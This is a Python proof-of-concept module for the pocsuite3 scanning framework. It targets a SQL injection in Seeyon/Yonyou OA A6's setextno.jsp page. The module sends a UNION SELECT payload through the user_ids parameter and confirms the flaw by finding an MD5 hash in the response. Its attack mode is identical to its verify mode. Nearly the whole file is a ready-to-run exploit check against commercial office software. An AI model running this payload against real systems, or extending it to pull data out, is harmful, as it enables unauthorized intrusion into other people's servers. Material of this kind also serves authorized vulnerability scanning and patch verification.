#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友致远OA A6 setextno.jsp sql注入漏洞'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''致远OA'''
    appVersion = '''A6'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url,ip,port = parse_ip_port(self.target)
        # Write your code here
        action1 = '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20all%20select%201,2,3,md5(996)%23'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        }
        verify_url = make_verify_url(self.url, action1, mod=0)
        resp1 = requests.get(verify_url, headers=headers, verify=False, timeout=15, allow_redirects=False)
        if resp1.status_code == 200 and b"0b8aff0438617c055eb55f0ba5d226fa" in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
